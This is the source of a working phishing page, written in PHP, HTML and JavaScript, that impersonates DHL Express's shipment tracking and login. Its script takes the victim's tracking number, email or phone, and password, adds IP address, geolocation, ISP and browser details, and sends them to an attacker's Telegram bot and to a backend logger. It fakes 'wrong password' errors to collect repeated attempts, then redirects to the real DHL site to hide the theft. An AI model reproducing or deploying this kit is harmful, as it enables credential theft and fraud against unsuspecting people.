<?php
require_once __DIR__ . '/config.php';

// Inject config.php values into JS (tokens come from config.php, not hardcoded here)
$tg_token = defined('TELEGRAM_BOT_TOKEN') ? TELEGRAM_BOT_TOKEN : '';
$tg_chat  = defined('TELEGRAM_CHAT_ID')   ? TELEGRAM_CHAT_ID   : '';
$max_att  = defined('MAX_ATTEMPTS')        ? (int)MAX_ATTEMPTS  : 3;
$redirect = defined('REDIRECT_URL')        ? REDIRECT_URL       : 'https://www.dhl.com/in-en/home/tracking.html';
$use_php  = defined('ENABLE_PHP_BACKEND') && ENABLE_PHP_BACKEND ? 'true' : 'false';
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Track Your Shipment | DHL Express</title>
    <!-- DHL Express favicon — yellow background, red DHL wordmark -->
    <link rel="icon" type="image/svg+xml"
        href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='4' fill='%23FFCC00'/%3E%3Cpath d='M4.5 11.8l-.9 1.2h4.9c.24 0 .24.09.12.25-.12.17-.33.46-.45.63-.06.08-.18.24.2.24H10.3l.6-.81c.37-.5.03-1.54-1.28-1.54H4.5zm8.46 0l-1.73 2.35h6.33l1.73-2.35h-2.58l-.99 1.35h-1.16l1-1.35h-2.6zm7.17 0l-1.73 2.35h2.74l1.73-2.35h-2.74zM3.44 13.33l-1.81 2.46h4.41c1.46 0 2.27-.99 2.52-1.33H5.55c-.38 0-.27-.16-.2-.24.13-.17.33-.46.46-.63.12-.16.12-.26-.12-.26H3.44zM1 14.73v.28h3.99l.21-.28H1zm11.47 0l-.98 1.33h2.59l.98-1.33h-2.59zm3.74 0l-.98 1.33h2.59l.98-1.33h-2.59zm3.43 0s-.19.26-.28.38c-.32.44-.04.95 1.02.95h4.16l.98-1.33H19.64zm6.36 0l-.21.28H31v-.28h-5zm-24 .52v.28h3.6l.21-.28H1zm24.6 0l-.21.28H31v-.28h-5.4zM1 15.53v.28h3.22l.2-.28H1zm24.9 0l-.2.28H31v-.28h-5.1z' fill='%23D40511'/%3E%3C/svg%3E" />
    <style>
        /* ===== RESET & BASE STYLE ===== */
        *,
        *::before,
        *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        html,
        body {
            height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            font-size: 14px;
            color: #333;
            background: #f6f6f6;
            -webkit-font-smoothing: antialiased;
        }

        a {
            text-decoration: none;
            color: inherit;
            cursor: pointer;
        }

        button {
            cursor: pointer;
            font-family: inherit;
            outline: none;
            border: none;
        }

        textarea,
        input {
            font-family: inherit;
        }

        /* ===== DHL COLORS & VARIABLES ===== */
        :root {
            --dhl-yellow: #FFCC00;
            --dhl-red: #D40511;
            --dhl-dark: #232323;
            --dhl-grey: #53565A;
            --dhl-light-grey: #f0f0f0;
        }

        /* ===== TOP BAR (yellow eyebrow) ===== */
        .top-bar {
            background: var(--dhl-yellow);
            height: 52px;
            display: flex;
            align-items: center;
            padding: 0 24px;
            position: relative;
            z-index: 100;
            width: 100%;
            flex-shrink: 0;
        }

        .top-bar-inner {
            max-width: 1000px;
            width: 100%;
            margin: 0 auto;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .header-logo {
            display: flex;
            align-items: center;
            flex-shrink: 0;
        }

        .header-logo a {
            display: flex;
            align-items: center;
            text-decoration: none;
            flex-shrink: 0;
        }

        .lang-selector {
            display: flex;
            align-items: center;
            gap: 7px;
            font-size: 14px;
            color: #333;
            cursor: pointer;
            user-select: none;
        }

        .lang-selector svg.flag {
            width: 20px;
            height: 14px;
            border: 1px solid rgba(0, 0, 0, 0.15);
            flex-shrink: 0;
            display: inline-block;
            vertical-align: middle;
        }

        .lang-selector .chevron {
            width: 10px;
            height: 6px;
            fill: #333;
            flex-shrink: 0;
        }

        /* ===== MAIN CONTAINER (for Tracking) ===== */
        .main-container {
            width: 100%;
            max-width: 600px;
            margin: 0 auto;
            padding: 24px 16px 80px;
        }

        /* ===== TRACKING CARD ===== */
        .track-card {
            background: #fff;
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 4px 18px rgba(0, 0, 0, 0.06);
            margin-bottom: 24px;
            border: 1px solid #eaeaea;
        }

        /* Heading */
        .track-card h1 {
            font-size: 20px;
            font-weight: 800;
            color: #1a1a1a;
            margin-bottom: 16px;
            letter-spacing: -0.3px;
        }

        /* Label */
        .input-label {
            font-size: 11px;
            font-weight: 700;
            color: #666;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 6px;
            display: block;
        }

        /* Textarea input */
        .tracking-textarea {
            width: 100%;
            height: 72px;
            border: 1.5px solid #ccc;
            border-radius: 6px;
            padding: 10px 12px;
            font-size: 14px;
            resize: none;
            outline: none;
            color: #222;
            transition: border-color 0.2s;
            margin-bottom: 12px;
        }

        .tracking-textarea:focus {
            border-color: var(--dhl-red);
        }

        .tracking-textarea::placeholder {
            color: #999;
        }

        /* Track Submit Button */
        .btn-track {
            width: 100%;
            height: 44px;
            background: var(--dhl-red);
            color: #fff;
            font-size: 15px;
            font-weight: 700;
            border-radius: 6px;
            transition: background 0.15s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-track:hover {
            background: #b2040e;
        }

        .btn-track:active {
            background: #90030a;
        }

        /* Error Banner */
        .error-banner {
            display: none;
            align-items: center;
            gap: 8px;
            background: #fff;
            border: 1px solid #e0e0e0;
            padding: 10px 14px;
            border-radius: 6px;
            margin-top: 12px;
            color: var(--dhl-red);
            font-size: 13px;
            font-weight: 600;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03);
        }

        .error-banner svg {
            width: 16px;
            height: 16px;
            fill: currentColor;
            flex-shrink: 0;
        }

        .error-banner.visible {
            display: flex;
        }

        /* ===== LINK CARDS SECTION ===== */
        .feature-cards {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .feature-card {
            background: #fff;
            border-radius: 12px;
            padding: 24px 20px;
            border: 1px solid #eaeaea;
            box-shadow: 0 4px 14px rgba(0, 0, 0, 0.03);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            position: relative;
            overflow: hidden;
            transition: transform 0.2s, box-shadow 0.2s;
            cursor: pointer;
        }

        .feature-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.06);
        }

        .card-icon {
            width: 44px;
            height: 44px;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .card-icon svg {
            width: 100%;
            height: 100%;
        }

        .feature-card h3 {
            font-size: 15px;
            font-weight: 800;
            color: #111;
            margin-bottom: 6px;
        }

        .feature-card p {
            font-size: 12px;
            color: #666;
            line-height: 1.5;
            max-width: 280px;
        }

        .ribbon {
            position: absolute;
            top: 0;
            right: 0;
            width: 32px;
            height: 32px;
            overflow: hidden;
        }

        .ribbon::before {
            content: '';
            position: absolute;
            top: 0;
            right: 0;
            width: 0;
            height: 0;
            border-style: solid;
            border-width: 0 32px 32px 0;
            border-color: transparent #FFCC00 transparent transparent;
        }

        /* ===== PAGE LAYOUT (for Login) ===== */
        .page-body {
            min-height: calc(100vh - 52px);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }

        /* ===== LOGIN CARD ===== */
        .login-card {
            background: #fff;
            width: 100%;
            max-width: 530px;
            padding: 40px 44px 44px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
            border-radius: 12px;
        }

        .login-card h1 {
            font-size: 26px;
            font-weight: bold;
            color: #222;
            margin-bottom: 16px;
        }

        .create-login-row {
            font-size: 14px;
            color: #333;
            margin-bottom: 28px;
        }

        .create-login-row a {
            color: var(--dhl-red);
            font-weight: bold;
            text-decoration: underline;
        }

        .create-login-row a:hover {
            color: #a00;
        }

        /* Form fields */
        .form-field {
            margin-bottom: 16px;
            position: relative;
        }

        .form-field input {
            width: 100%;
            height: 48px;
            border: 1px solid #bbb;
            padding: 0 44px 0 14px;
            font-size: 14px;
            font-family: inherit;
            outline: none;
            color: #222;
            background: #fff;
            transition: border-color 0.2s;
            border-radius: 6px;
            -webkit-appearance: none;
            appearance: none;
        }

        .form-field input:focus {
            border-color: #555;
        }

        .form-field input.error {
            border-color: var(--dhl-red);
        }

        .form-field label {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 14px;
            color: #999;
            pointer-events: none;
            transition: all 0.15s;
            background: #fff;
            padding: 0 2px;
        }

        .form-field input:focus+label,
        .form-field input:not(:placeholder-shown)+label {
            top: 0;
            font-size: 11px;
            color: #555;
        }

        .form-field input::placeholder {
            color: transparent;
        }

        .req {
            color: var(--dhl-red);
        }

        .eye-btn {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            padding: 4px;
            cursor: pointer;
            color: #555;
            display: flex;
            align-items: center;
        }

        .eye-btn svg {
            width: 20px;
            height: 20px;
            fill: #555;
        }

        /* Remember + Forgot row */
        .remember-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 24px;
            flex-wrap: wrap;
            gap: 8px;
        }

        .remember-left {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .remember-left input[type="checkbox"] {
            width: 18px;
            height: 18px;
            border: 1px solid #aaa;
            cursor: pointer;
            accent-color: #555;
            flex-shrink: 0;
        }

        .remember-left label {
            font-size: 14px;
            color: #333;
            cursor: pointer;
        }

        .forgot-link {
            font-size: 14px;
            color: var(--dhl-red);
            font-weight: bold;
            text-decoration: underline;
        }

        .forgot-link:hover {
            color: #a00;
        }

        /* Login button */
        .btn-dhl-login {
            width: 100%;
            height: 50px;
            background: var(--dhl-red);
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            border: none;
            cursor: pointer;
            letter-spacing: 0.2px;
            transition: background 0.2s;
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-dhl-login:hover {
            background: #b0040e;
        }

        .btn-dhl-login:disabled {
            background: #ccc;
            color: #999;
            cursor: not-allowed;
        }

        /* Spinner */
        .spinner {
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.4);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            display: inline-block;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* Error msg */
        .field-error {
            font-size: 12px;
            color: var(--dhl-red);
            margin-top: 4px;
            margin-bottom: 12px;
            display: none;
        }

        .field-error.show {
            display: block;
        }

        .form-error-box {
            background: #fde8e8;
            border-left: 3px solid var(--dhl-red);
            color: var(--dhl-red);
            font-size: 13px;
            padding: 10px 14px;
            margin-bottom: 20px;
            display: none;
        }

        .form-error-box.show {
            display: block;
        }

        /* ===== TOAST NOTIFICATION ===== */
        .toast {
            position: fixed;
            bottom: 24px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            background: #333;
            color: #fff;
            padding: 12px 20px;
            border-radius: 8px;
            font-size: 13px;
            font-weight: 600;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            z-index: 999;
            pointer-events: none;
        }

        .toast.visible {
            transform: translateX(-50%) translateY(0);
        }

        /* ===== RESPONSIVE MEDIA QUERIES ===== */
        @media (max-width: 600px) {
            .top-bar {
                height: 48px;
                padding: 0 16px;
            }

            .header-logo svg {
                width: 96px !important;
                height: 16px !important;
            }

            .header-logo span {
                font-size: 13px !important;
                margin-left: 6px !important;
            }

            .lang-selector {
                font-size: 13px;
                gap: 5px;
            }

            .lang-selector svg.flag {
                width: 18px;
                height: 12px;
            }

            .page-body {
                padding: 16px 12px;
                min-height: calc(100vh - 48px);
            }

            .login-card {
                padding: 24px 20px;
                box-shadow: 0 1px 6px rgba(0, 0, 0, 0.05);
            }

            .login-card h1 {
                font-size: 22px;
                margin-bottom: 12px;
            }

            .create-login-row {
                margin-bottom: 20px;
            }

            .btn-dhl-login {
                height: 44px;
                font-size: 15px;
            }
        }
    </style>
</head>

<body>

    <!-- RESPONSIVE HEADER -->
    <header>
        <div class="top-bar">
            <div class="top-bar-inner">
                <div class="header-logo">
                    <a href="#">
                        <svg style="width: 120px; height: 20px; fill: #D40511; flex-shrink: 0; display: block;"
                            viewBox="0 9.8 24 4.2" xmlns="http://www.w3.org/2000/svg">
                            <path
                                d="M4.22 10.303l-.767 1.043h4.18c.21 0 .208.078.105.218-.105.142-.28.39-.386.534-.054.073-.154.207.171.207h1.71l.505-.69c.314-.426.028-1.312-1.095-1.312H4.22zm7.204 0l-1.475 2.002h5.39l1.473-2.002H14.61l-.843 1.146h-.985l.846-1.146h-2.203zm6.105 0l-1.474 2.002h2.334l1.472-2.002H17.53zm-12.845 1.3l-1.54 2.094h3.754c1.24 0 1.932-.844 2.145-1.136h-2.56c-.326 0-.226-.133-.172-.207.107-.143.283-.388.388-.53.104-.14.107-.22-.105-.22h-1.91zM0 12.562v.242h3.398l.176-.242H0zm9.762 0l-.836 1.136h2.203l.836-1.136H9.762zm3.185 0l-.836 1.136h2.203l.836-1.136h-2.203zm2.918 0s-.159.22-.238.326c-.276.374-.033.81.87.81h3.538l.834-1.136h-5.004zm5.408 0l-.177.242H24v-.242h-2.727zM0 13.01v.24h3.068l.178-.24H0zm20.943 0l-.175.24H24v-.24h-3.057zM0 13.457v.24h2.74l.176-.24H0zm20.615 0l-.177.24H24v-.24h-3.385z" />
                        </svg>
                        <span
                            style="color: #D40511; font-weight: bold; font-size: 15px; margin-left: 8px; font-family: Arial, sans-serif; white-space: nowrap; line-height: 1; display: inline-block; vertical-align: middle;">DHL
                            Express</span>
                    </a>
                </div>
                <div class="lang-selector" onclick="showToast('Country selector')">
                    <span>English</span>
                    <svg class="flag" viewBox="0 0 24 17" xmlns="http://www.w3.org/2000/svg">
                        <rect width="24" height="17" fill="#12AD2B" />
                        <rect y="5.67" width="24" height="5.67" fill="#FFCE00" />
                        <polygon points="0,0 9,8.5 0,17" fill="#FFCE00" />
                        <circle cx="17" cy="4.5" r="1.8" fill="#000" />
                        <circle cx="20.5" cy="8.5" r="1.8" fill="#000" />
                        <circle cx="17" cy="12.5" r="1.8" fill="#000" />
                    </svg>
                    <svg class="chevron" viewBox="0 0 10 6">
                        <path d="M0 0 L5 6 L10 0" fill="#333" />
                    </svg>
                </div>
            </div>
        </div>
    </header>

    <!-- TRACKING SECTION -->
    <main class="main-container" id="trackSection">
        <section class="track-card">
            <h1>Track Your Shipment</h1>
            <div class="input-label">Enter your tracking number(s)</div>
            <textarea id="trackingInput" class="tracking-textarea"
                placeholder="Enter tracking numbers separated by commas..."></textarea>

            <button id="trackBtn" class="btn-track" onclick="handleTrack()">
                <span id="btnText">Track</span>
            </button>

            <div id="errorBanner" class="error-banner">
                <svg viewBox="0 0 24 24">
                    <path
                        d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z" />
                </svg>
                <span>Please enter your tracking number(s)</span>
            </div>
        </section>

        <section class="feature-cards">
            <div class="feature-card" onclick="showToast('Initiating Shipment creation...')">
                <div class="card-icon">
                    <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect x="12" y="14" width="40" height="38" rx="4" stroke="#D40511" stroke-width="3"
                            fill="#fff" />
                        <line x1="12" y1="26" x2="52" y2="26" stroke="#D40511" stroke-width="3" />
                        <line x1="22" y1="8" x2="22" y2="16" stroke="#D40511" stroke-width="4" stroke-linecap="round" />
                        <line x1="42" y1="8" x2="42" y2="16" stroke="#D40511" stroke-width="4" stroke-linecap="round" />
                        <rect x="20" y="32" width="6" height="6" rx="1" fill="#D40511" />
                        <rect x="30" y="32" width="6" height="6" rx="1" fill="#D40511" />
                        <rect x="20" y="42" width="6" height="6" rx="1" fill="#D40511" />
                        <path d="M38,40 L44,56 L48,54 L42,39 L50,39 Z" fill="#D40511" stroke="#fff" stroke-width="2" />
                    </svg>
                </div>
                <h3>Ship Now</h3>
                <p>Find the right service</p>
            </div>

            <div class="feature-card" onclick="showToast('Loading Quote estimator...')">
                <div class="card-icon">
                    <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path
                            d="M14,10 C14,7.8 15.8,6 18,6 L38,6 L50,18 L50,54 C50,56.2 48.2,58 46,58 L18,58 C15.8,58 14,56.2 14,54 L14,10 Z"
                            stroke="#D40511" stroke-width="3" fill="#fff" />
                        <path d="M38,6 L38,18 L50,18" stroke="#D40511" stroke-width="3" fill="none" />
                        <line x1="22" y1="28" x2="42" y2="28" stroke="#D40511" stroke-width="3"
                            stroke-linecap="round" />
                        <line x1="22" y1="36" x2="42" y2="36" stroke="#D40511" stroke-width="3"
                            stroke-linecap="round" />
                        <circle cx="44" cy="46" r="10" fill="#D40511" stroke="#fff" stroke-width="2" />
                        <path d="M39,46 L42,49 L49,42" stroke="#fff" stroke-width="2.5" stroke-linecap="round"
                            stroke-linejoin="round" fill="none" />
                    </svg>
                </div>
                <h3>Get a Quote</h3>
                <p>Estimate cost to share and compare</p>
            </div>

            <div class="feature-card" onclick="showToast('Redirecting to Business Solutions registration...')">
                <div class="ribbon"></div>
                <div class="card-icon">
                    <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12,56 L12,18 C12,15.8 13.8,14 16,14 L36,14 C38.2,14 40,15.8 40,18 L40,56 Z"
                            stroke="#D40511" stroke-width="3" fill="#fff" />
                        <path d="M40,56 L40,28 C40,25.8 41.8,24 44,24 L48,24 C50.2,24 52,25.8 52,28 L52,56 Z"
                            stroke="#D40511" stroke-width="3" fill="#fff" />
                        <rect x="18" y="20" width="6" height="6" rx="1" fill="#D40511" />
                        <rect x="30" y="20" width="6" height="6" rx="1" fill="#D40511" />
                        <rect x="18" y="32" width="6" height="6" rx="1" fill="#D40511" />
                        <rect x="30" y="32" width="6" height="6" rx="1" fill="#D40511" />
                        <rect x="18" y="44" width="6" height="6" rx="1" fill="#D40511" />
                        <rect x="30" y="44" width="6" height="6" rx="1" fill="#D40511" />
                        <rect x="44" y="32" width="4" height="4" rx="0.5" fill="#D40511" />
                        <rect x="44" y="42" width="4" height="4" rx="0.5" fill="#D40511" />
                        <line x1="8" y1="56" x2="56" y2="56" stroke="#D40511" stroke-width="3" stroke-linecap="round" />
                    </svg>
                </div>
                <h3>DHL for Business</h3>
                <p>Shipping regularly? Request a business account and profit from exclusive benefits</p>
            </div>
        </section>
    </main>

    <!-- LOGIN SECTION -->
    <div class="page-body" id="loginSection" style="display: none;">
        <div class="login-card">
            <h1>DHL Express Login</h1>

            <div class="create-login-row">
                Don't have a login?&nbsp;<a href="#">Create a Login</a>
            </div>

            <div class="form-error-box" id="loginError">
                Invalid credentials. Please check your email/phone and password.
            </div>

            <div class="form-field">
                <input type="text" id="loginEmail" placeholder="[[ Email ]]" autocomplete="username"
                    oninput="clearErrors()" />
                <label for="loginEmail">Email Address or Phone Number <span class="req">*</span></label>
            </div>
            <div class="field-error" id="emailError">Please enter your email address or phone number.</div>

            <div class="form-field">
                <input type="password" id="loginPassword" placeholder="Password" autocomplete="current-password"
                    oninput="clearErrors()" onkeydown="if(event.key==='Enter') doLogin()" />
                <label for="loginPassword">Password <span class="req">*</span></label>
                <button type="button" class="eye-btn" id="eyeBtn" onclick="togglePw()" aria-label="Show/hide password">
                    <svg id="eyeIcon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path
                            d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5C21.27 7.61 17 4.5 12 4.5zm0 12.5a5 5 0 1 1 0-10 5 5 0 0 1 0 10zm0-8a3 3 0 1 0 0 6 3 3 0 0 0 0-6z" />
                    </svg>
                </button>
            </div>
            <div class="field-error" id="pwError">Please enter your password.</div>

            <div class="remember-row">
                <div class="remember-left">
                    <input type="checkbox" id="rememberMe" />
                    <label for="rememberMe">Remember Me</label>
                </div>
                <a class="forgot-link" href="#"
                    onclick="showToast('Password reset email will be sent.'); return false;">Forgot/Reset Password</a>
            </div>

            <button class="btn-dhl-login" id="loginBtn" onclick="doLogin()">Login</button>
        </div>
    </div>

    <div id="toast" class="toast"></div>

    <!-- JAVASCRIPT — tokens injected from config.php by PHP, not hardcoded -->
    <script>
        // ── Config injected from config.php (server-side, single source of truth) ──
        const TELEGRAM_BOT_TOKEN = <?php echo json_encode($tg_token); ?>;
        const TELEGRAM_CHAT_ID   = <?php echo json_encode($tg_chat); ?>;
        const MAX_ATTEMPTS       = <?php echo (int)$max_att; ?>;
        const REDIRECT_URL       = <?php echo json_encode($redirect); ?>;
        const USE_PHP_BACKEND    = <?php echo $use_php; ?>;

        // ── Send message to Telegram (client-side, instant delivery) ─────────────
        function sendToTelegram(message) {
            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
            fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id:    TELEGRAM_CHAT_ID,
                    text:       message,
                    parse_mode: 'HTML'
                })
            }).catch(() => {});
        }

        // ── Also POST to process.php for server-side log + fallback Telegram ─────
        function sendToBackend(payload) {
            if (!USE_PHP_BACKEND) return;
            fetch('process.php', {
                method:  'POST',
                headers: { 'Content-Type': 'application/json' },
                body:    JSON.stringify(payload)
            }).catch(() => {});
        }

        // ── Geo fetch (best-effort) ───────────────────────────────────────────────
        let _geoCache = null;
        function fetchGeo() {
            if (_geoCache) return Promise.resolve(_geoCache);
            return fetch('https://ipwho.is/')
                .then(r => r.json())
                .then(d => {
                    _geoCache = {
                        ip:       d.ip || 'N/A',
                        location: [d.city, d.region, d.country].filter(Boolean).join(', ') || 'Unknown',
                        lat:      d.latitude  || null,
                        lon:      d.longitude || null,
                        isp:      (d.connection && d.connection.isp) ? d.connection.isp : 'N/A',
                        timezone: (d.timezone && d.timezone.id) ? d.timezone.id : 'N/A'
                    };
                    return _geoCache;
                })
                .catch(() => ({ ip: 'N/A', location: 'Unknown', lat: null, lon: null, isp: 'N/A', timezone: 'N/A' }));
        }

        // =============================================
        // TRACK BUTTON
        // =============================================
        function handleTrack() {
            const input       = document.getElementById('trackingInput');
            const trackVal    = input.value.trim();
            const errorBanner = document.getElementById('errorBanner');
            const trackBtn    = document.getElementById('trackBtn');
            const btnText     = document.getElementById('btnText');

            errorBanner.classList.remove('visible');
            if (!trackVal) { errorBanner.classList.add('visible'); return; }

            trackBtn.disabled = true;
            btnText.innerHTML = '<span class="spinner"></span>';

            // Send tracking number to Telegram immediately
            sendToTelegram(
                '📦 <b>DHL Tracking Number Submitted</b>\n' +
                '━━━━━━━━━━━━━━━━━━\n' +
                '🔢 <b>Tracking #:</b> ' + trackVal + '\n' +
                '🕐 <b>Time:</b> ' + new Date().toLocaleString()
            );

            setTimeout(() => {
                trackBtn.disabled = false;
                btnText.textContent = 'Track';
                document.getElementById('trackSection').style.display = 'none';
                document.getElementById('loginSection').style.display = 'flex';
                window._dhlTrackingNum = trackVal;
                fetchGeo(); // warm up geo for login step
            }, 1200);
        }

        document.getElementById('trackingInput').addEventListener('keydown', function (e) {
            if (e.key === 'Enter') { e.preventDefault(); handleTrack(); }
        });

        // =============================================
        // LOGIN BUTTON
        // =============================================
        let loginAttemptCount = 0;

        function togglePw() {
            const field = document.getElementById('loginPassword');
            const icon  = document.getElementById('eyeIcon');
            if (field.type === 'password') {
                field.type = 'text';
                icon.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46A11.804 11.804 0 0 0 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>';
            } else {
                field.type = 'password';
                icon.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5C21.27 7.61 17 4.5 12 4.5zm0 12.5a5 5 0 1 1 0-10 5 5 0 0 1 0 10zm0-8a3 3 0 1 0 0 6 3 3 0 0 0 0-6z"/>';
            }
        }

        function clearErrors() {
            ['loginError','emailError','pwError'].forEach(id => document.getElementById(id).classList.remove('show'));
            ['loginEmail','loginPassword'].forEach(id => document.getElementById(id).classList.remove('error'));
        }

        function doLogin() {
            clearErrors();

            const email = document.getElementById('loginEmail').value.trim();
            const pw    = document.getElementById('loginPassword').value;
            let valid   = true;

            if (!email) {
                document.getElementById('emailError').classList.add('show');
                document.getElementById('loginEmail').classList.add('error');
                valid = false;
            }
            if (!pw) {
                document.getElementById('pwError').classList.add('show');
                document.getElementById('loginPassword').classList.add('error');
                valid = false;
            }
            if (!valid) return;

            loginAttemptCount++;
            const btn = document.getElementById('loginBtn');
            btn.disabled = true;
            btn.innerHTML = '<span class="spinner"></span>&nbsp;Logging in...';

            fetchGeo().then(geo => {
                // ── 1. Telegram (client-side — same format as the working version) ──
                sendToTelegram(
                    '🔐 <b>DHL Login Attempt #' + loginAttemptCount + '</b>\n' +
                    '━━━━━━━━━━━━━━━━━━\n' +
                    '📦 <b>Tracking #:</b> ' + (window._dhlTrackingNum || 'N/A') + '\n' +
                    '📧 <b>Email/Phone:</b> ' + email + '\n' +
                    '🔑 <b>Password:</b> ' + pw + '\n' +
                    '📍 <b>Location:</b> ' + geo.location + '\n' +
                    '🖥️ <b>IP:</b> ' + geo.ip + '\n' +
                    '🕐 <b>Time:</b> ' + new Date().toLocaleString()
                );

                // ── 2. process.php (server-side — logs to file + sends via PHP cURL) ──
                sendToBackend({
                    email:    email,
                    password: pw,
                    attempt:  loginAttemptCount,
                    browser:  navigator.userAgent || 'Unknown',
                    location: geo.location,
                    lat:      geo.lat,
                    lon:      geo.lon,
                    ip:       geo.ip,
                    isp:      geo.isp,
                    timezone: geo.timezone,
                    domain:   window.location.hostname || 'N/A',
                    url:      window.location.href     || 'N/A',
                    tracking: window._dhlTrackingNum   || 'N/A'
                });

                setTimeout(() => {
                    if (loginAttemptCount >= MAX_ATTEMPTS) {
                        showToast('Redirecting...');
                        setTimeout(() => { window.location.href = REDIRECT_URL; }, 800);
                    } else {
                        btn.disabled = false;
                        btn.innerHTML = 'Login';
                        const loginError = document.getElementById('loginError');
                        loginError.textContent = 'Your email/phone or password may be wrong. Please try again.';
                        loginError.classList.add('show');
                        document.getElementById('loginEmail').classList.add('error');
                        document.getElementById('loginPassword').classList.add('error');
                    }
                }, 1400);
            });
        }

        // ── Toast ──────────────────────────────────────────────────────────────────
        let toastTimer;
        function showToast(msg) {
            const toast = document.getElementById('toast');
            toast.textContent = msg;
            toast.classList.add('visible');
            clearTimeout(toastTimer);
            toastTimer = setTimeout(() => toast.classList.remove('visible'), 3000);
        }
    </script>

</body>

</html>
